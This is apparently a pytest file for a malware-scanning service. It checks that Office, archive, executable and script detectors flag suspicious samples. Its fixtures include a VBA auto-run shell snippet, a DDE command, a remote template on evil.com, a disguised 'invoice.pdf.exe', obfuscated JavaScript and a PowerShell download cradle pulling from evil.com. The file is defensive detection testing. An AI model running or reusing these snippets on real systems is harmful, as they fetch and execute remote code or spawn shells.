"""Tests for the deep file analysis providers (M8-P2a)."""

from __future__ import annotations

import struct
import zipfile
from io import BytesIO

from ai.file_analysis.providers import (
    ArchiveProvider,
    ExecutableProvider,
    OfficeDocumentProvider,
    ScriptProvider,
)
from core.domain.intelligence import ThreatCategory
from services.file_analysis.ingestion import FileIngestor

_INGEST = FileIngestor()


def _make_zip(*entries: tuple[str, bytes]) -> bytes:
    buf = BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in entries:
            zf.writestr(name, data)
    return buf.getvalue()


# --- Office Document Provider ---


def test_office_detects_vba_macros() -> None:
    data = b'\xd0\xcf\x11\xe0 Auto_Open Shell("cmd.exe") vba_project'
    artifact = _INGEST.ingest("evil.doc", data)
    evidence = OfficeDocumentProvider().assess(artifact)
    assert evidence.risk >= 0.8
    assert evidence.category is ThreatCategory.MALICIOUS_DOCUMENT


def test_office_detects_dde() -> None:
    data = b"\xd0\xcf\x11\xe0 DDEAUTO some command"
    artifact = _INGEST.ingest("dde.doc", data)
    evidence = OfficeDocumentProvider().assess(artifact)
    assert evidence.risk >= 0.7
    assert any("T1559" in (e.technique_id or "") for e in evidence.contributions)


def test_office_detects_external_template() -> None:
    data = b"\xd0\xcf\x11\xe0 attachedTemplate http://evil.com/template.dotm"
    artifact = _INGEST.ingest("template.doc", data)
    evidence = OfficeDocumentProvider().assess(artifact)
    assert evidence.risk >= 0.75
    assert any("T1221" in (e.technique_id or "") for e in evidence.contributions)


def test_office_clean_document() -> None:
    artifact = _INGEST.ingest("clean.txt", b"Normal business document content.")
    evidence = OfficeDocumentProvider().assess(artifact)
    assert evidence.risk == 0.0


# --- Archive Provider ---


def test_archive_flags_dangerous_types() -> None:
    data = _make_zip(("payload.exe", b"MZ\x90\x00"), ("readme.txt", b"hello"))
    artifact = _INGEST.ingest("delivery.zip", data)
    evidence = ArchiveProvider().assess(artifact)
    assert evidence.risk >= 0.7
    assert evidence.category is ThreatCategory.MALICIOUS_ARCHIVE


def test_archive_detects_masquerading() -> None:
    data = _make_zip(("invoice.pdf.exe", b"MZ"))
    artifact = _INGEST.ingest("delivery.zip", data)
    evidence = ArchiveProvider().assess(artifact)
    assert any("masquerading" in c.feature for c in evidence.contributions)
    assert any("T1036" in (c.technique_id or "") for c in evidence.contributions)


def test_archive_detects_nested_archive() -> None:
    inner = _make_zip(("nested.txt", b"data"))
    data = _make_zip(("inner.zip", inner))
    artifact = _INGEST.ingest("outer.zip", data)
    evidence = ArchiveProvider().assess(artifact)
    assert any("nested" in c.feature for c in evidence.contributions)


def test_archive_clean_zip() -> None:
    data = _make_zip(("readme.txt", b"hello"), ("notes.md", b"# notes"))
    artifact = _INGEST.ingest("docs.zip", data)
    evidence = ArchiveProvider().assess(artifact)
    assert evidence.risk == 0.0


# --- Executable Provider ---


def test_executable_flags_unsigned_pe() -> None:
    dos = bytearray(b"MZ" + b"\x00" * 62)
    struct.pack_into("<I", dos, 0x3C, 64)
    pe = b"PE\x00\x00" + struct.pack("<HHIIIHH", 0x14C, 1, 1234567890, 0, 0, 0xE0, 0)
    opt = struct.pack("<H", 0x10B) + b"\x00" * (0xE0 - 2)
    section = (
        b".text\x00\x00\x00" + struct.pack("<IIII", 0x1000, 0x1000, 0x200, 0x200) + b"\x00" * 24
    )
    data = bytes(dos) + pe + opt + section + b"\x00" * 512
    artifact = _INGEST.ingest("tool.exe", data)
    evidence = ExecutableProvider().assess(artifact)
    assert evidence.risk > 0
    assert any("unsigned" in c.feature for c in evidence.contributions)


def test_executable_not_pe() -> None:
    artifact = _INGEST.ingest("script.txt", b"just text content")
    evidence = ExecutableProvider().assess(artifact)
    assert evidence.risk == 0.0


# --- Script Provider (expanded) ---


def test_script_detects_obfuscation() -> None:
    data = b"var x = String.fromCharCode(72,101,108); eval(atob('aGVsbG8='));"
    artifact = _INGEST.ingest("obfusc.js", data)
    evidence = ScriptProvider().assess(artifact)
    assert any("obfuscation" in c.feature for c in evidence.contributions)


def test_script_detects_download_cradle() -> None:
    data = b"powershell -noprofile Invoke-WebRequest http://evil.com/p -OutFile c.exe"
    artifact = _INGEST.ingest("dl.ps1", data)
    evidence = ScriptProvider().assess(artifact)
    assert evidence.risk >= 0.75
    assert evidence.category is ThreatCategory.MALICIOUS_SCRIPT


# --- Provider metadata ---


def test_providers_expose_metadata() -> None:
    artifact = _INGEST.ingest("test.txt", b"safe content")
    for provider_cls in (
        OfficeDocumentProvider,
        ArchiveProvider,
        ExecutableProvider,
        ScriptProvider,
    ):
        evidence = provider_cls().assess(artifact)
        assert evidence.provider_name
        assert evidence.provider_version == "1.0.0"


def test_contributions_carry_recommendations() -> None:
    data = b'\xd0\xcf\x11\xe0 Auto_Open Shell("cmd.exe") vba_project'
    artifact = _INGEST.ingest("evil.doc", data)
    evidence = OfficeDocumentProvider().assess(artifact)
    triggered = [c for c in evidence.contributions if c.triggered]
    assert any(c.recommendation for c in triggered)
    assert any(c.technique_id for c in triggered)
